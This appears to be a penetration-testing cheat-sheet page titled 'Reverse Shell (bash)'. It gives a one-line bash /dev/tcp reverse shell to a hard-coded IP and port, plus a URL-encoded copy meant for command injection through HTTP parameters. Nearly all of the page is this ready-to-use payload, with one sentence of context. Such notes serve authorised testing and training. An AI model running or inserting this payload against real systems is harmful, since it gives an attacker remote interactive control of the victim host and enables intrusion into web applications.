---
title: "Reverse Shell (bash)"
---

# Reverse Shell (bash)

Reverse shell via bash `/dev/tcp`, useful when `nc` is not available. The URL-encoded version is used for injection via HTTP parameters.

```shell
/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.242/443 0>&1'

# URL encoded (for injection via HTTP parameters)
%2Fbin%2Fbash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E45%2E242%2F443%200%3E%261%27
```
